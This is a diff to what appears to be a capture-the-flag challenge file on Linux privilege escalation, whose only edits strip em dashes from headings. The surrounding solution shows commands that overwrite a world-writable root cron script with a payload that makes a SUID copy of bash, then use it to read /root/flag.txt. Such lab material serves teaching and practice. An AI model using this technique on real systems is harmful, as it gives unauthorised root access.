@@ -1,4 +1,4 @@
-# Challenge 3 — Writable Cron Script
+# Challenge 3  Writable Cron Script
 
 **Difficulty:** Easy  
 **Category:** Linux Privilege Escalation  
@@ -9,7 +9,7 @@
 ## Story
 
 You're on a Linux server. There's a scheduled maintenance task running as root.
-Look around — maybe the sysadmin didn't lock down the files it depends on.
+Look around  maybe the sysadmin didn't lock down the files it depends on.
 
 ---
 
@@ -59,9 +59,9 @@ A common trick is to copy `/bin/bash` and give it the SUID bit, then run that co
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Discover the cron job
+### Step 1  Discover the cron job
 
 ```bash
 cat /etc/cron.d/maintenance
@@ -74,7 +74,7 @@ Output:
 
 Root runs this script every minute.
 
-### Step 2 — Check file permissions
+### Step 2  Check file permissions
 
 ```bash
 ls -la /opt/maintenance/cleanup.sh
@@ -85,9 +85,9 @@ Output:
 -rwxrwxrwx  /opt/maintenance/cleanup.sh
 ```
 
-Anyone can write to it — including us.
+Anyone can write to it  including us.
 
-### Step 3 — Overwrite the script with a payload
+### Step 3  Overwrite the script with a payload
 
 This payload creates a SUID copy of bash:
 
@@ -97,7 +97,7 @@ cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash' > /opt/maintenance/cleanup.sh
 ```
 
-### Step 4 — Wait up to one minute, then use the SUID bash
+### Step 4  Wait up to one minute, then use the SUID bash
 
 ```bash
 # Wait for cron to fire (check every few seconds)
@@ -109,7 +109,7 @@ watch -n 2 ls -la /tmp/rootbash
 
 The `-p` flag preserves the SUID effective UID (root).
 
-### Step 5 — Read the flag
+### Step 5  Read the flag
 
 ```bash
 cat /root/flag.txt
